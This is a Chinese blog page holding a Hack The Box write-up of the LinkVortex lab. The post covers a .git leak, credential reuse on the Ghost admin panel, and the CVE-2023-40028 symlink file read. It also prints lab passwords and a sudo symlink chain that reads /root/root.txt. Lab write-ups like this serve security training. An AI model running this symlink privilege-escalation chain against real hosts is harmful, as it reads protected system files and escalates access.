@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-LinkVortex | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="fscan扫描没什么内容 目录扫描扫到 1http:&#x2F;&#x2F;linkvortex.htb&#x2F;robots.txt  123456User-agent: *Sitemap: http:&#x2F;&#x2F;linkvortex.htb&#x2F;sitemap.xmlDisallow: &#x2F;ghost&#x2F;Disallow: &#x2F;p&#x2F;Disallow: &#x2F;email&#x2F;Disallow: &#x2F;r&#x2F;  一个登录框，但是暂时利用不起来  fuzz出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-LinkVortex">
+<meta property="og:url" content="https://xyaxxya.github.io/posts/d681991e.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="fscan扫描没什么内容 目录扫描扫到 1http:&#x2F;&#x2F;linkvortex.htb&#x2F;robots.txt  123456User-agent: *Sitemap: http:&#x2F;&#x2F;linkvortex.htb&#x2F;sitemap.xmlDisallow: &#x2F;ghost&#x2F;Disallow: &#x2F;p&#x2F;Disallow: &#x2F;email&#x2F;Disallow: &#x2F;r&#x2F;  一个登录框，但是暂时利用不起来  fuzz出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?4374">
+<meta property="article:published_time" content="2025-03-21T07:22:54.000Z">
+<meta property="article:modified_time" content="2025-03-22T05:08:09.211Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?4374"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/d681991e.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="JKAzMndNFupeAvLybmTDZQvXJ-qzwexiresLFX-aPSw"/><meta name="msvalidate.01" content="46A43356A247D4026C1F053B84E2275F"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-LinkVortex',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2025-03-22 13:08:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">78</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?4374')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB-LinkVortex</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-21T07:22:54.000Z" title="发表于 2025-03-21 15:22:54">2025-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-22T05:08:09.211Z" title="更新于 2025-03-22 13:08:09">2025-03-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">447</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/d681991e.html" data-flag-title="HTB-LinkVortex"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/d681991e.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/d681991e.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>fscan扫描没什么内容 目录扫描扫到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://linkvortex.htb/robots.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Sitemap: http://linkvortex.htb/sitemap.xml</span><br><span class="line">Disallow: /ghost/</span><br><span class="line">Disallow: /p/</span><br><span class="line">Disallow: /email/</span><br><span class="line">Disallow: /r/</span><br></pre></td></tr></table></figure>
+
+<p>一个登录框，但是暂时利用不起来</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250321153848230.png" alt="image-20250321153848230"></p>
+<p>fuzz出一个<code>[Launching Soon](http://dev.linkvortex.htb/)</code></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250321154500599.png" alt="image-20250321154500599"></p>
+<p>git泄露</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250321154546045.png" alt="image-20250321154546045"></p>
+<p>githack和githacker拉下来不大一样</p>
+<p>可以获取到一些敏感信息泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const email = &#x27;test@example.com&#x27;;</span><br><span class="line">const password = &#x27;OctopiFociPilfer45&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>学到了一个新姿势</p>
+<p>可以关注&#x2F;.git&#x2F;logs&#x2F;HEAD是对应的上传者的相关信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root &lt;dev@linkvortex.htb&gt; 1730322603 +0000	clone: from https://github.com/TryGhost/Ghost.git</span><br></pre></td></tr></table></figure>
+
+<p>将dev改为admin后登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@linkvortex.htb</span><br><span class="line">OctopiFociPilfer45</span><br></pre></td></tr></table></figure>
+
+<p>查阅到版本为<a target="_blank" rel="noopener" href="https://github.com/TryGhost/Ghost/releases/tag/v5.58.0">5.58.0</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028">0xDTC&#x2F;Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028: CVE-2023-40028 affects Ghost, an open source content management system, where versions prior to 5.59.1 allow authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system.</a></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322124858385.png" alt="image-20250322124858385"></p>
+<p>拿其他账号的账号密码</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322124956985.png" alt="image-20250322124956985"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;user&quot;: &quot;bob@linkvortex.htb&quot;,</span><br><span class="line">&quot;pass&quot;: &quot;fibber-talented-worth&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ssh连接后拿user.txt</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322125129012.png" alt="image-20250322125129012"></p>
+<p>sudo -l发现(ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;opt&#x2F;ghost&#x2F;clean_symlink.sh *.png</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322125206795.png" alt="image-20250322125206795"></p>
+<p><strong>clean_symlink.sh</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">QUAR_DIR=<span class="string">&quot;/var/quarantined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$CHECK_CONTENT</span> ];<span class="keyword">then</span></span><br><span class="line">  CHECK_CONTENT=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">LINK=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="string">&quot;<span class="variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;! First argument must be a png file !&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="variable">$LINK</span>;<span class="keyword">then</span></span><br><span class="line">  LINK_NAME=$(/usr/bin/basename <span class="variable">$LINK</span>)</span><br><span class="line">  LINK_TARGET=$(/usr/bin/readlink <span class="variable">$LINK</span>)</span><br><span class="line">  <span class="keyword">if</span> /usr/bin/echo <span class="string">&quot;<span class="variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="string">&#x27;(etc|root)&#x27;</span>;<span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;! Trying to read critical files, removing link [ <span class="variable">$LINK</span> ] !&quot;</span></span><br><span class="line">    /usr/bin/unlink <span class="variable">$LINK</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Link found [ <span class="variable">$LINK</span> ] , moving it to quarantine&quot;</span></span><br><span class="line">    /usr/bin/mv <span class="variable">$LINK</span> <span class="variable">$QUAR_DIR</span>/</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$CHECK_CONTENT</span>;<span class="keyword">then</span></span><br><span class="line">      /usr/bin/echo <span class="string">&quot;Content:&quot;</span></span><br><span class="line">      /usr/bin/cat <span class="variable">$QUAR_DIR</span>/<span class="variable">$LINK_NAME</span> 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>经典软链接利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /root/root.txt 1.txt</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /home/bob/1.txt 1.png</span><br><span class="line">bob@linkvortex:~$ sudo CHECK_CONTENT=<span class="literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/1.png</span><br><span class="line">Link found [ /home/bob/1.png ] , moving it to quarantine</span><br><span class="line">Content:</span><br><span class="line">xxxxxxxxxxxxxxxxxxx</span><br><span class="line">bob@linkvortex:~$ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322130350143.png" alt="image-20250322130350143"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/d681991e.html">https://xyaxxya.github.io/posts/d681991e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?4374" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/92e7967d.html" title="HTB-Administrator"><img class="cover" src="https://www.dmoe.cc/random.php?1633" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTB-Administrator</div></div></a></div><div class="next-post pull-right"><a href="/posts/93b35a6e.html" title="春秋云境-Delegation"><img class="cover" src="https://www.dmoe.cc/random.php?8862" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云境-Delegation</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/undefined.html" title="HackMyVM Airbind"><img class="cover" src="https://www.dmoe.cc/random.php?519" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="title">HackMyVM Airbind</div></div></a></div><div><a href="/posts/92e7967d.html" title="HTB-Administrator"><img class="cover" src="https://www.dmoe.cc/random.php?1633" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-22</div><div class="title">HTB-Administrator</div></div></a></div><div><a href="/posts/49801.html" title="HackMyVM TriplAdvisor"><img class="cover" src="https://www.dmoe.cc/random.php?7151" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-25</div><div class="title">HackMyVM TriplAdvisor</div></div></a></div><div><a href="/posts/64517.html" title="2-Lampiao"><img class="cover" src="https://www.dmoe.cc/random.php?292" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">2-Lampiao</div></div></a></div><div><a href="/posts/33164.html" title="1-GoldenEye-v1"><img class="cover" src="https://www.dmoe.cc/random.php?5059" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-15</div><div class="title">1-GoldenEye-v1</div></div></a></div><div><a href="/posts/39849.html" title="3-Raven2"><img class="cover" src="https://www.dmoe.cc/random.php?533" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">3-Raven2</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">78</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/92e7967d.html" title="HTB-Administrator"><img src="https://www.dmoe.cc/random.php?1633" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Administrator"/></a><div class="content"><a class="title" href="/posts/92e7967d.html" title="HTB-Administrator">HTB-Administrator</a><time datetime="2025-03-22T05:37:36.000Z" title="发表于 2025-03-22 13:37:36">2025-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d681991e.html" title="HTB-LinkVortex"><img src="https://www.dmoe.cc/random.php?4374" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-LinkVortex"/></a><div class="content"><a class="title" href="/posts/d681991e.html" title="HTB-LinkVortex">HTB-LinkVortex</a><time datetime="2025-03-21T07:22:54.000Z" title="发表于 2025-03-21 15:22:54">2025-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/93b35a6e.html" title="春秋云境-Delegation"><img src="https://www.dmoe.cc/random.php?8862" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云境-Delegation"/></a><div class="content"><a class="title" href="/posts/93b35a6e.html" title="春秋云境-Delegation">春秋云境-Delegation</a><time datetime="2025-03-20T08:50:19.000Z" title="发表于 2025-03-20 16:50:19">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/54ae0e11.html" title="HTB-Cat"><img src="https://www.dmoe.cc/random.php?2796" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Cat"/></a><div class="content"><a class="title" href="/posts/54ae0e11.html" title="HTB-Cat">HTB-Cat</a><time datetime="2025-03-20T05:26:00.000Z" title="发表于 2025-03-20 13:26:00">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2a97a4ed.html" title="HTB-Alert"><img src="https://www.dmoe.cc/random.php?3321" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Alert"/></a><div class="content"><a class="title" href="/posts/2a97a4ed.html" title="HTB-Alert">HTB-Alert</a><time datetime="2025-03-19T08:21:44.000Z" title="发表于 2025-03-19 16:21:44">2025-03-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
